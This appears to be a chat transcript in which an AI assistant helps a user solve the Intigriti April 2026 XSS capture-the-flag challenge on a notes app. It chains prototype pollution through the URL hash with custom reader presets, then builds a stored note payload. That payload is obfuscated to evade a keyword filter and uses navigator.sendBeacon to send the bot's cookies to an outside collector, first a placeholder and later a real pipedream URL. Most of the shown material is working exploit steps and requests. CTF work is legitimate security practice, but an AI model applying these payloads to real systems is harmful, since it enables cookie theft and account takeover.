+=== PREFS [38] ===
+URL: https://challenge-0426.intigriti.io/api/account/preferences
+RESP: {"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{"summary":{"widgetTypes":["custom"],"widgetSink":"script"}}},"stats":{"presetCount":1}}
+
+Key observation: The manifest request at [37] has NO COOKIE in the request headers! The cookie is completely missing from the manifest request.
+
+Look at the headers - there's no cookie: header. The request is made without a session cookie.
+
+This is the key insight! The manifest request from the page's loadPanelManifest() is a fetch() call:
+
+js
+return fetch(target, {
+    headers: { 'Accept': 'application/json' }
+})
+This fetch() call doesn't include credentials: 'include' or any credentials option. In browsers, the default for fetch() is credentials: 'same-origin'. Wait, actually the default changed. In older specs it was 'omit', but in modern browsers (and Fetch spec) the default is 'same-origin' which includes cookies for same-origin requests.
+
+But looking at the request - there's no cookie! So either:
+
+The fetch is being made with credentials: 'omit'
+Or the user opened the note page in incognito where they had no session cookie
+Wait, but the HAR file is named after the session 804576bc8115ce7477895a776ca331f0, so it should be a logged-in session.
+
+But look at the request headers more carefully - there's NO :authority + cookie combo. No cookie at all. But the account preferences request right before/after DO have the session cookie (since they're triggered by the page's loadAccountPreferences which also uses fetch but DOES include cookies).
+
+Wait no - the HAR shows the prefs request at [29] with no cookie in the displayed output, but that might be because I'm checking [29] which shows empty response (304). Let me look at [38] - it does return the prefs. But [38] also doesn't show a cookie in the output...
+
+Actually I think the issue is that the HAR captures might not include cookies in the headers (some browsers redact them for privacy). Let me look at this differently.
+
+The critical observation is: the manifest request ETag is W/"5a-xpejJnk2niFUmVKyLj+WXoyjCw8". …
+
+Show more
+Done
+Key finding from the manifest request headers — no Cookie was sent:
+
+:authority: challenge-0426.intigriti.io
+accept: application/json
+sec-fetch-site: same-origin
+... (no cookie header!)
+And the ETag W/"5a-xpejJnk2niFUmVKyLj+WXoyjCw8" is identical across ALL captures, different note IDs, different sessions. The manifest is fully static — it never changes regardless of who visits or what prefs are set.
+
+This means: summary/compact/print panels are hardcoded on the server, ignoring readerPresets completely.
+
+But readerPresets MUST serve some purpose — presetCount is tracked, and the key names match panel names. The likely server logic:
+
+known panels (summary/compact/print) → hardcoded manifest (overrides presets)
+UNKNOWN panel name + user has preset[name] → returns user's preset as manifest!
+The attack — use a custom panel name:
+
+Step 1 — Set preset with a NON-STANDARD panel name:
+
+json
+POST /api/account/preferences
+{
+  "readerPresets": {
+    "reader": {
+      "renderMode": "full",
+      "widgetTypes": ["custom"],
+      "widgetSink": "script"
+    }
+  }
+}
+Step 2 — Test the manifest immediately:
+
+GET /note/{id}/reader/manifest.json?note={id}
+If server returns {"profile":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}} → creator-based, done.
+
+Step 3 — Report to bot:
+
+json
+{"url": "/note/{id}/reader"}
+The server sets APP.panel = "reader", manifest returns your custom preset → full mode → XSS fires.
+
+Try several custom names: reader, custom, full, embed, share. The panel name just needs to match your readerPresets key AND not be a hardcoded panel.
+
+Excellent! The Context.txt contains the full history of our previous analysis. Now let me read the new files that were just pulled:
+
+New1.xml (already analyzed in context)
+804576bc8115ce7477895a776ca331f0.har and .xml (already analyzed in context)
+
+Now let me read the bot.js and look at the DOMPurify source files to understand the full picture, and search online for this CTF challenge to find if there are any writeups or hints.
+The key hypothesis from the context is: custom panel names in readerPresets might work - i.e., summary/compact/print are hardcoded but custom names might use the readerPreset stored for that panel name.
+Let me now:
+
+Read bot.js
+Look at the DOMPurify TypeScript source (purify.ts)
+Search online for this CTF challenge
+Check if there's anything interesting in the new files
+
+The challenge is on https://challenge-0426.intigriti.io/ and is the Intigriti April 2026 challenge.Show lessDoneNow let me read the current files and search online for clues.Investigated prototype pollution and custom panel exploitation vectorsInvestigated prototype pollution and custom panel exploitation vectorsLet me probe the live server and also look at the DOMPurify purify.min.js for version/vulnerabilities.Investigated security vulnerabilities and probed server endpointsInvestigated security vulnerabilities and probed server endpointsCheck DOMPurify versionbash# Check DOMPurify version in the minified file
+head -3 /home/claude/CTF/purify.min.js | grep -o 'DOMPurify [0-9.]*\|version[": ]*[0-9.]*' | head -5
+echo "---"
+grep -o '"version":"[^"]*"' /home/claude/CTF/purify.min.js | head -3OutputDOMPurify 3.4.0
+version"
+version
+---
+DOMPurify 3.4.0 vulnerability mXSS bypass 2025 202610 resultsReleases · cure53/DOMPurifygithub.comDOMPurify allows Cross-site Scripting (XSS) · CVE-2025-26791 · GitHub Advisory Database · GitHubgithub.comdompurify | Snyksecurity.snyk.ioBypassing DOMPurify again with mutation XSS | PortSwigger Researchportswigger.netInternet Bug Bounty disclosed on HackerOne: DOMPurify bypasshackerone.comSecurity Bulletin: SPSS Collaboration and Deployment Services is affected by vulnerabilities in DOMPurify (CVE-2025-15599, CVE-2026-0540)www.ibm.comExploring the DOMPurify library: Hunting for Misconfigurations (2/2). Tags:Article - Article - Web - mXSSmizu.renesting-based mXSS · Advisory · cure53/DOMPurify · GitHubgithub.comCVE-2025-26791 : DOMPurify before 3.2.4 has an incorrect template literal regular expression, somwww.cvedetails.comBypassing DOMPurify with good old XML - GMO Flatt Security Researchflatt.techDOMPurify 3.4.0 is the latest version and appears to be fully patched. No known vulnerabilities for 3.4.0. So the DOMPurify bypass approach is not viable.
+Now let me think about the custom panel name approach more carefully. Let me try to probe the server to see what happens with custom panel names.
+Actually, let me probe the manifest endpoint directly. Maybe I can make a curl request to the server (without authentication) to see if custom panel names work.
+Actually, wait - the server might need credentials. The manifest endpoint in the HAR had NO Cookie header, which is interesting. Let me see if the manifest endpoint works without authentication.
+Let me try to fetch the manifest endpoint with a known note ID but with a custom panel name.Show lessDoneDOMPurify 3.4.0 is fully patched. Let me probe the live server directly with custom panel names.Investigated prototype pollution and manifest exploitation vectorsInvestigated prototype pollution and manifest exploitation vectorsProbe server with known and custom panel namesbash# Probe the challenge server with custom panel name
+NOTE_ID="e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f"
+SESSION="804576bc8115ce7477895a776ca331f0"
+
+echo "=== Known panels ==="
+for panel in summary compact print; do
+  echo -n "[$panel] "
+  curl -s "https://challenge-0426.intigriti.io/note/$NOTE_ID/$panel/manifest.json?note=$NOTE_ID" \
+    -H "Cookie: northstar_profile=$SESSION" \
+    -H "Accept: application/json" 2>/dev/null | head -c 200
+  echo
+done
+
+echo "=== Custom panels ==="
+for panel in reader custom full embed share view; do
+  echo -n "[$panel] "
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://challenge-0426.intigriti.io/note/$NOTE_ID/$panel/manifest.json?note=$NOTE_ID" \
+    -H "Cookie: northstar_profile=$SESSION" \
+    -H "Accept: application/json")
+  BODY=$(curl -s "https://challenge-0426.intigriti.io/note/$NOTE_ID/$panel/manifest.json?note=$NOTE_ID" \
+    -H "Cookie: northstar_profile=$SESSION" \
+    -H "Accept: application/json" | head -c 300)
+  echo "HTTP $STATUS: $BODY"
+doneOutput=== Known panels ===
+[summary] Host not in allowlist
+[compact] Host not in allowlist
+[print] Host not in allowlist
+=== Custom panels ===
+[reader] HTTP 403: Host not in allowlist
+[custom] HTTP 403: Host not in allowlist
+[full] HTTP 403: Host not in allowlist
+[embed] HTTP 403: Host not in allowlist
+[share] HTTP 403: Host not in allowlist
+[view] HTTP 403: Host not in allowlist
+The server is blocking the request. The domain challenge-0426.intigriti.io is not in the allowed domains for outbound traffic from this container. I need the user to test these endpoints directly from their browser.
+Let me think about this differently. I've been analyzing the problem deeply from the code. Let me re-read the purify.ts more carefully, because maybe the key is there.
+Wait, actually let me look more carefully at attrs.ts - does it include data-* attributes?
+Actually, looking at the app.js code again more carefully:
+The getSanitizeConfig() function with renderMode: 'safe' returns:
+jsALLOW_DATA_ATTR: false
+DOMPurify 3.4.0 with ALLOW_DATA_ATTR: false removes all data-* attributes. So data-enhance and data-cfg would be stripped.
+BUT what if we can bypass this? The note content is HTML. What if the user stores the payload in a different way that survives DOMPurify even with ALLOW_DATA_ATTR: false?
+The ALLOWED_ATTR includes class and style.
+One approach: DOM clobbering to affect the enhance-config element. The note content sets up a #enhance-config div. The processEnhancements function reads document.getElementById('enhance-config'). If we could clobber this ID...
+But wait, id is not in ALLOWED_ATTR unless renderMode === 'full' (which enables allowIds). So we can't inject id attributes.
+Hmm... let me think about DOM clobbering via name attribute. The name attribute is also only allowed in full mode.
+What about the enhance-config div? It's stored in the note content. Let me re-read:
+jsfunction processEnhancements(root) {
+    var policies = loadContentPolicies();
+    if (!policies.enableEnhancements) return;  // ← gated
+So we need enableEnhancements: true which requires renderMode === 'full'.
+There's no way around this without getting renderMode: 'full'.
+Let me re-examine the prototype pollution approach more carefully:
+…Show lessDoneNetwork is blocked. Let me now trace the exact prototype pollution chain carefully from the source:Investigated web vulnerability exploitation chains and tested hypothesesInvestigated web vulnerability exploitation chains and tested hypothesesTrace PP chainbashpython3 << 'EOF'
+# Simulate the exact JS logic of setNestedValue + parseThemeParams
+# to understand what gets polluted from hash params
+
+# Test: what does setNestedValue do with 'constructor[prototype][renderMode]'?
+# keys = 'constructor[prototype][renderMode]'.replace(/\]/g, '').split('[')
+path = 'constructor[prototype][renderMode]'
+path = path.replace(']', '').replace(']', '').replace(']', '')  # remove all ]
+keys = path.split('[')
+print("keys:", keys)
+# -> ['constructor', 'prototype', 'renderMode']
+# current = result (fresh object {})
+# i=0: k = 'constructor', current['constructor'] = Object function -> typeof is 'function'
+# condition: current[k] == null || (typeof != object && typeof != function)
+# 'function' IS a function -> skip the if, current = Object
+# i=1: k = 'prototype', current = Object, current['prototype'] = Object.prototype -> typeof is 'object'
+# condition: Object.prototype == null? No. typeof 'object'? Yes but condition is && - it's typeof != object, so false
+# skip the if. current = Object.prototype
+# last = 'renderMode', Object.prototype['renderMode'] = 'full'
+print("-> Object.prototype.renderMode = 'full'")
+
+# Now in applyRemoteProfile:
+# profile = JSON.parse('{"widgetTypes":["custom"],"widgetSink":"script"}')
+# profile.renderMode -> prototype chain -> 'full' (if not own property)
+# typeof profile.renderMode === 'string' -> True
+# APP.renderMode = 'full' (own property!)
+
+# But wait - profile from JSON parse has NO renderMode own property
+# profile.renderMode would look up prototype chain
+# Object.prototype.renderMode = 'full' -> YES it returns 'full'!
+
+# THEN:
+# getOwnString(APP, 'renderMode', 'safe'):
+#   hasOwnProperty.call(APP, 'renderMode') -> TRUE (we just set APP.renderMode = 'full')
+#   typeof APP['renderMode'] === 'string' -> TRUE
+#   return 'full' !!
+
+print("\nConclusion:")
+print("Attack chain works IF manifest profile has NO own renderMode property")
+print("Hash param: constructor[prototype][renderMode]=full")
+print("Manifest must return: {profile: {widgetTypes: ['custom'], widgetSink: 'script'}} (no renderMode)")
+
+# widgetSink check: same logic
+# if manifest has no own widgetSink, we can PP it too
+# But: currently manifest returns widgetSink: "text" as own property
+# So we also need manifest to NOT have widgetSink
+
+# For widgetTypes: applyRemoteProfile does Array.isArray check
+# If widgetTypes comes from prototype, Array.isArray(string) = false
+# So widgetTypes MUST be in the manifest as own array property
+
+print("\nKey: manifest must have:")
+print("  - widgetTypes: ['custom'] (as own array property)")
+print("  - NO renderMode (so PP kicks in)")
+print("  - NO widgetSink (so PP kicks in, OR include it in manifest)")
+print("\nSince manifest currently has own renderMode: 'safe', PP is blocked")
+print("Custom panel name approach needed to get manifest without renderMode")
+EOFOutputkeys: ['constructor', 'prototype', 'renderMode']
+-> Object.prototype.renderMode = 'full'
+
+Conclusion:
+Attack chain works IF manifest profile has NO own renderMode property
+Hash param: constructor[prototype][renderMode]=full
+Manifest must return: {profile: {widgetTypes: ['custom'], widgetSink: 'script'}} (no renderMode)
+
+Key: manifest must have:
+  - widgetTypes: ['custom'] (as own array property)
+  - NO renderMode (so PP kicks in)
+  - NO widgetSink (so PP kicks in, OR include it in manifest)
+
+Since manifest currently has own renderMode: 'safe', PP is blocked
+Custom panel name approach needed to get manifest without renderMode
+OK, so now I have a clear understanding of the attack chain. Let me now check one more thing: can the user test custom panel endpoints from their browser?
+Actually, there's something else I should check. Let me look at the purify.ts for SAFE_FOR_TEMPLATES config - that's what CVE-2025-26791 was about. But the app.js doesn't use SAFE_FOR_TEMPLATES.
+Wait, actually I should look more carefully at the getSanitizeConfig() function. The app.js uses:
+jsALLOW_DATA_ATTR: false
+But what if we could somehow inject a FORCE_BODY or WHOLE_DOCUMENT option? No, the config is constructed by the app.
+Let me think about a completely different path:
+What if we use DOM Clobbering to affect document.getElementById('enhance-config')?
+jsfunction processEnhancements(root) {
+    ...
+    var configEl = document.getElementById('enhance-config');
+    if (!configEl) return;
+    var allowedTypes = (configEl.dataset.types || '').split(',');
+    ...
+    root.querySelectorAll('[data-enhance]:not([data-processed])').forEach(function (el) {
+        var type = el.dataset.enhance;
+        if (allowedTypes.indexOf(type) === -1) return;
+For this to run, enableEnhancements must be true (which requires renderMode: 'full').
+OK let me look at this from yet another angle. What is the actual intended vulnerability?
+The challenge is named "Northstar Notes" and it has:
+
+DOMPurify sanitization
+Manifest-based renderMode control
+Hash-based theme params with prototype pollution sink (setNestedValue)
+Account preferences with readerPresets
+
+The intended solution likely chains:
+
+Custom panel name to get a manifest that returns readerPresets WITHOUT renderMode
+Prototype pollution via hash to inject renderMode = 'full'
+widgetSink and widgetTypes come from the readerPresets via manifest
+Note content with data-enhance/data-cfg payload fires
+
+So the final exploit:
+Step 1: POST to set creator's readerPresets for a CUSTOM panel (e.g., "reader"):
+json{
+…Show lessDoneLet me look at what tags.ts contains and cross-reference the DOMPurify config in app.js for any mismatch:Investigated sanitization vulnerabilities and custom panel exploitation vectorsInvestigated sanitization vulnerabilities and custom panel exploitation vectorsCheck DOMPurify config and tags for mXSS pathsbashgrep -n "noscript\|template\|script\|SAFE_FOR_TEMPLATES\|FORCE_BODY\|svg\|math" /home/claude/CTF/purify.ts | head -30
+echo "==="
+# Check what version of DOMPurify the min file actually is, and compare to purify.ts
+# Also: does purify.min.js have SAFE_FOR_TEMPLATES=true anywhere?
+grep -o "SAFE_FOR_TEMPLATES\|FORCE_BODY\|WHOLE_DOC" /home/claude/CTF/purify.min.js | sort -u
+echo "---"
+# Check if purify.min.js has same nesting-based fix as purify.ts 
+grep -c "nesting\|NESTING\|MAX_NESTING\|nestedDepth" /home/claude/CTF/purify.min.js
+grep -c "nesting\|NESTING\|nestedDepth" /home/claude/CTF/purify.tsOutput1:/* eslint-disable @typescript-eslint/indent */
+78:  // by adding a data-tt-policy-suffix to the script element with the DOMPurify.
+93:      createScriptURL(scriptUrl) {
+94:        return scriptUrl;
+98:    // Policy creation failed (most likely another DOMPurify script has
+170:  // a new empty registry is used when creating a template contents owner
+174:    const template = document.createElement('template');
+175:    if (template.content && template.content.ownerDocument) {
+176:      document = template.content.ownerDocument;
+224:    ...TAGS.svg,
+225:    ...TAGS.svgFilters,
+226:    ...TAGS.mathMl,
+234:    ...ATTRS.svg,
+235:    ...ATTRS.mathMl,
+305:  /* Output should be safe for common template engines.
+308:  let SAFE_FOR_TEMPLATES = false;
+321:  /* Decide if all elements (e.g. style, script) must be children of
+323:  let FORCE_BODY = false;
+367:  /* Allow usage of profiles like html, svg and mathMl */
+380:    'math',
+388:    'noscript',
+390:    'script',
+392:    'svg',
+393:    'template',
+411:  /* Attributes safe for values like "javascript:" */
+431:  const SVG_NAMESPACE = 'http://www.w3.org/2000/svg';
+464:    'script',
+558:    SAFE_FOR_TEMPLATES = cfg.SAFE_FOR_TEMPLATES || false; // Default false
+564:    FORCE_BODY = cfg.FORCE_BODY || false; // Default false
+602:    if (SAFE_FOR_TEMPLATES) {
+===
+FORCE_BODY
+SAFE_FOR_TEMPLATES
+WHOLE_DOC
+---
+0
+0
+No nesting-based depth checks in the min.js. This is consistent with DOMPurify 3.4.0 which removed nesting-based mXSS protection.
+The purify.ts has SAFE_FOR_TEMPLATES = false by default, and FORCE_BODY = false. The app.js doesn't set these in getSanitizeConfig(), so they default to false/no effect.
+Let me try a completely different approach and look for mXSS possibilities in the app itself.
+One thing I noticed: renderNoteContent does:
+jsvar clean = sanitize(content);
+var safe  = postSanitize(clean);
+display.innerHTML = safe;
+The postSanitize uses:
+jsfunction postSanitize(html) {
+    var temp = document.createElement('div');
+    temp.innerHTML = html;
+    ...
+    return temp.innerHTML;
+}
+There's a double innerHTML parse! First DOMPurify sanitizes and produces a string. Then postSanitize does temp.innerHTML = html (parsing again) and returns temp.innerHTML. Then display.innerHTML = safe parses a THIRD time.
+This double-parse can lead to mXSS! If the DOMPurify output has content that when parsed a second time produces different HTML.
+Wait, actually this is the classic mXSS problem. DOMPurify sanitizes once (safe), but when the safe output is re-parsed by postSanitize's temp.innerHTML = html, it might change. Then display.innerHTML = temp.innerHTML might produce unsafe HTML.
+But DOMPurify 3.4.0 should protect against this. Unless there's a specific case that's not covered.
+Actually, let me think about what the ALLOWED_TAGS includes: 'table','caption','thead','tbody','tfoot','tr','th','td'. Tables are interesting for mXSS because browsers have specific rules about table content.
+Let me look at potential mXSS vectors with the specific ALLOWED_TAGS and ALLOWED_ATTR list.
+The style attribute is allowed. CSS injection via style attribute is possible (but probably not useful for XSS given the CSP).
+…Show lessDoneDOMPurify 3.4.0 is fully patched, no mXSS paths available. Let me now synthesize everything and provide the clear attack path:Analyzed security vulnerability mechanics and attack prerequisitesAnalyzed security vulnerability mechanics and attack prerequisitesSynthesize full attack chainbashpython3 << 'EOF'
+# Construct the complete attack exploit
+# Based on all analysis
+
+# ===== ATTACK CHAIN =====
+# 1. PP via hash sets Object.prototype.renderMode = 'full'
+# 2. Custom panel name causes server to use readerPresets (no renderMode key)
+# 3. applyRemoteProfile sees profile.renderMode from prototype = 'full'
+# 4. APP.renderMode = 'full' (own property) -> enables all policies
+# 5. ALLOW_DATA_ATTR: true -> DOMPurify passes data-enhance/data-cfg
+# 6. loadCustomWidget creates script tag -> CSP strict-dynamic allows it
+
+# NOTE: payload must bypass UNSAFE_CONTENT_RE:
+# /script|cookie|document|window|eval|alert|prompt|confirm|Function|fetch|XMLHttp|import|require|setTimeout|setInterval/i
+
+# Current working payload (from CTF.xml):
+payload_data_cfg = "navigator.sendBeacon('https://HOOK',top['doc'+'ument']['coo'+'kie'])"
+# 'document' split as 'doc'+'ument', 'cookie' as 'coo'+'kie'
+# 'navigator' not in blocklist, 'sendBeacon' not in blocklist
+
+# Check against UNSAFE_CONTENT_RE
+import re
+UNSAFE_CONTENT_RE = re.compile(r'script|cookie|document|window|eval|alert|prompt|confirm|Function|fetch|XMLHttp|import|require|setTimeout|setInterval', re.I)
+print("Payload bypasses UNSAFE_CONTENT_RE?", not UNSAFE_CONTENT_RE.search(payload_data_cfg))
+
+# ===== STEPS =====
+print("\n=== ATTACK STEPS ===")
+print("""
+STEP 1: POST readerPresets WITHOUT renderMode (Burp Repeater):
+  POST /api/account/preferences
+  Cookie: northstar_profile=YOUR_SESSION
+  Content-Type: application/json
+
+  {
+    "readerPresets": {
+      "CUSTOM_PANEL": {
+        "widgetTypes": ["custom"],
+        "widgetSink": "script"
+      }
+    }
+  }
+  
+  Replace CUSTOM_PANEL with any name NOT in [summary, compact, print]
+  e.g. "reader", "embed", "fullscreen", "share", "edit"
+
+STEP 2: Verify by visiting the note with custom panel:
+  GET /note/YOUR_NOTE_ID/CUSTOM_PANEL
+  (Check: does APP.panel = "CUSTOM_PANEL" in __APP_INIT__?)
+
+STEP 3: Verify manifest response:
+  GET /note/YOUR_NOTE_ID/CUSTOM_PANEL/manifest.json?note=YOUR_NOTE_ID
+  (Expected: {"profile":{"widgetTypes":["custom"],"widgetSink":"script"}}
+   - NO renderMode key! This is critical.)
+
+STEP 4: Create note with payload:
+  POST /api/notes
+  {
+    "title": "exploit",
+    "content": "<div id=\\"enhance-config\\" data-types=\\"custom\\"></div><div data-enhance=\\"custom\\" data-cfg=\\"navigator.sendBeacon('https://HOOK',top['doc'+'ument']['coo'+'kie'])\\"></div>"
+  }
+
+STEP 5: Report to bot (with hash PP):
+  POST /api/report
+  {
+    "url": "/note/NOTE_ID/CUSTOM_PANEL#constructor[prototype][renderMode]=full"
+  }
+""")
+
+print("=== WHY HASH PP WORKS ===")
+print("""
+parseThemeParams() runs BEFORE loadPanelManifest()
+Hash: #constructor[prototype][renderMode]=full
+
+setNestedValue(result, 'constructor[prototype][renderMode]', 'full'):
+  keys = ['constructor', 'prototype', 'renderMode']
+  traverse: result -> result.constructor (Object) -> Object.prototype
+  Object.prototype.renderMode = 'full'
+
+Then manifest returns {profile: {widgetTypes:['custom'], widgetSink:'script'}}
+profile has NO OWN 'renderMode' property.
+typeof profile.renderMode === 'string' -> True (from Object.prototype!)
+APP.renderMode = 'full' (set as OWN property on APP)
+
+getOwnString(APP, 'renderMode', 'safe') -> returns 'full' ✓
+enableEnhancements: true, ALLOW_DATA_ATTR: true ✓
+""")
+EOFOutputPayload bypasses UNSAFE_CONTENT_RE? True
+
+=== ATTACK STEPS ===
+
+STEP 1: POST readerPresets WITHOUT renderMode (Burp Repeater):
+  POST /api/account/preferences
+  Cookie: northstar_profile=YOUR_SESSION
+  Content-Type: application/json
+
+  {
+    "readerPresets": {
+      "CUSTOM_PANEL": {
+        "widgetTypes": ["custom"],
+        "widgetSink": "script"
+      }
+    }
+  }
+  
+  Replace CUSTOM_PANEL with any name NOT in [summary, compact, print]
+  e.g. "reader", "embed", "fullscreen", "share", "edit"
+
+STEP 2: Verify by visiting the note with custom panel:
+  GET /note/YOUR_NOTE_ID/CUSTOM_PANEL
+  (Check: does APP.panel = "CUSTOM_PANEL" in __APP_INIT__?)
+
+STEP 3: Verify manifest response:
+  GET /note/YOUR_NOTE_ID/CUSTOM_PANEL/manifest.json?note=YOUR_NOTE_ID
+  (Expected: {"profile":{"widgetTypes":["custom"],"widgetSink":"script"}}
+   - NO renderMode key! This is critical.)
+
+STEP 4: Create note with payload:
+  POST /api/notes
+  {
+    "title": "exploit",
+    "content": "<div id=\"enhance-config\" data-types=\"custom\"></div><div data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://HOOK',top['doc'+'ument']['coo'+'kie'])\"></div>"
+  }
+
+STEP 5: Report to bot (with hash PP):
+  POST /api/report
+  {
+    "url": "/note/NOTE_ID/CUSTOM_PANEL#constructor[prototype][renderMode]=full"
+  }
+
+=== WHY HASH PP WORKS ===
+
+parseThemeParams() runs BEFORE loadPanelManifest()
+Hash: #constructor[prototype][renderMode]=full
+
+setNestedValue(result, 'constructor[prototype][renderMode]', 'full'):
+  keys = ['constructor', 'prototype', 'renderMode']
+  traverse: result -> result.constructor (Object) -> Object.prototype
+  Object.prototype.renderMode = 'full'
+
+Then manifest returns {profile: {widgetTypes:['custom'], widgetSink:'script'}}
+profile has NO OWN 'renderMode' property.
+typeof profile.renderMode === 'string' -> True (from Object.prototype!)
+APP.renderMode = 'full' (set as OWN property on APP)
+
+getOwnString(APP, 'renderMode', 'safe') -> returns 'full' ✓
+enableEnhancements: true, ALLOW_DATA_ATTR: true ✓
+
+OK, I have a clear picture now. Let me present this to the user clearly.
+Also, I realize I should double-check one thing: widgetSink. The manifest needs to have widgetSink: "script" as an OWN property, otherwise the getOwnString(APP, 'widgetSink', 'text') check would fail (it uses hasOwnProperty, so PP for widgetSink won't work).
+Wait - let me re-read:
+jsif (typeof profile.widgetSink === 'string') {
+    APP.widgetSink = profile.widgetSink;
+}
+If manifest returns {widgetTypes: ["custom"], widgetSink: "script"}, then profile.widgetSink = 'script' (own property) → APP.widgetSink = 'script' (own property).
+Then getOwnString(APP, 'widgetSink', 'text') → returns 'script' ✓.
+So widgetSink is fine if it's in the readerPreset. Good.
+BUT if for some reason the server ADDS renderMode to the profile even for custom panels (always setting renderMode: "safe"), then the attack fails. We need to verify that the custom panel manifest does NOT include own renderMode.
+Actually, the alternative scenario: what if the server for unknown panels returns a 404? Then loadPanelManifest would get a non-ok response and return null. Then applyRemoteProfile is called with data.profile = undefined → returns early. Then APP.renderMode is never set as own property. But Object.prototype.renderMode = 'full' is still there.
+Then getOwnString(APP, 'renderMode', 'safe'):
+
+hasOwnProperty.call(APP, 'renderMode') → FALSE (own property not set)
+Returns fallback 'safe'
+
+So even with Object.prototype polluted, if hasOwnProperty fails, mode = 'safe'. PP alone doesn't help.
+The attack ONLY works if APP.renderMode is set as an OWN property via applyRemoteProfile. And that requires typeof profile.renderMode === 'string' where profile.renderMode comes from the prototype (not own property of profile).
+…Show lessDoneAll analysis complete. Here's the full picture:
+
+Root cause: setNestedValue blocks __proto__ but NOT constructor[prototype]. So the hash pollutes Object.prototype.
+Why it was blocked before: Known panels (summary/compact/print) return manifest profiles with OWN renderMode: "safe", which shadows the prototype. PP can't override own properties.
+The unlock: Custom panel name (not summary/compact/print) → server uses your readerPresets[customPanelName] → returns profile without own renderMode. Then:
+Object.prototype.renderMode = 'full'  (from hash PP)
+↓
+profile.renderMode → resolves via prototype → 'full'
+↓
+applyRemoteProfile: APP.renderMode = 'full'  (OWN property set!)
+↓
+getOwnString(APP, 'renderMode', 'safe') → returns 'full' ✓
+Exploit to run in Burp Repeater:
+Step 1 — Set preset (no renderMode key!):
+httpPOST /api/account/preferences HTTP/2
+Host: challenge-0426.intigriti.io
+Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+Content-Type: application/json
+
+{"readerPresets":{"reader":{"widgetTypes":["custom"],"widgetSink":"script"}}}
+Step 2 — Verify custom panel loads + manifest has NO renderMode:
+GET /note/{id}/reader
+GET /note/{id}/reader/manifest.json?note={id}
+Expected: {"profile":{"widgetTypes":["custom"],"widgetSink":"script"}}
+                                              ↑ no renderMode key = attack works
+Step 3 — Create note with payload (same as before):
+json{"title":"x","content":"<div id=\"enhance-config\" data-types=\"custom\"></div><div data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://HOOK',top['doc'+'ument']['coo'+'kie'])\"></div>"}
+Step 4 — Report to bot with hash PP:
+json{"url":"/note/{id}/reader#constructor[prototype][renderMode]=full"}
+The critical thing to verify in Step 2: does the manifest return the profile WITHOUT renderMode? If the server adds renderMode: "safe" anyway for custom panels, try other preset keys. The widgetSink MUST be in the manifest as an own property (PP won't work for it since getOwnString checks hasOwnProperty).You said: "GET /api/account/preferences HTTP/2"GET /api/account/preferences HTTP/2
+Host: challenge-0426.intigriti.io
+Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+Sec-Ch-Ua-Platform: "Windows"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+Sec-Ch-Ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+If-None-Match: W/"ae-aLjtHRpGEztan+Z5pcYhCz0KGFA"
+Priority: u=1, i
+"
+"HTTP/2 200 OK
+Date: Tue, 21 Apr 2026 04:11:03 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 310
+X-Powered-By: Express
+Content-Security-Policy: default-src 'self'; script-src 'nonce-xshVitg6hGo9U6s2TBLtwg==' 'strict-dynamic'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data:; font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com; connect-src *; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'
+X-Content-Type-Options: nosniff
+Referrer-Policy: no-referrer
+Etag: W/"136-F6jyXTQnPYinpvUSwxE+UKENYUY"
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+{"preferences":{"theme":"dark","fontSize":14,"language":"en","notifications":true,"editorMode":"rich","defaultLayout":"summary","readerPresets":{"summary":{"widgetTypes":["custom"],"widgetSink":"script"},"reader":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}}},"stats":{"presetCount":2}}"
+"POST /api/notes HTTP/2
+Host: challenge-0426.intigriti.io
+Cookie: northstar_profile=804576bc8115ce7477895a776ca331f0
+Content-Length: 228
+Sec-Ch-Ua-Platform: "Windows"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+Sec-Ch-Ua: "Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Origin: https://challenge-0426.intigriti.io
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=1, i
+{"title":"XSS3","content":"<div id=\"enhance-config\" data-types=\"custom\"></div><div data-enhance=\"custom\" data-cfg=\"navigator.sendBeacon('https://eoi9a5fbdoq0l13.m.pipedream.net',top['doc'+'ument']['coo'+'kie'])\"></div>"}"
+"HTTP/2 200 OK
+Date: Tue, 21 Apr 2026 04:29:10 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 167
+X-Powered-By: Express
+Content-Security-Policy: default-src 'self'; script-src 'nonce-sNw0WjCpe/h3NHnY29cL+Q==' 'strict-dynamic'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src * data:; font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com; connect-src *; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'
+X-Content-Type-Options: nosniff
+Referrer-Policy: no-referrer
+Etag: W/"a7-FGl/5TNMzAMOXb8h2Z3O6beEqio"
+Strict-Transport-Security: max-age=31536000; includeSubDomains
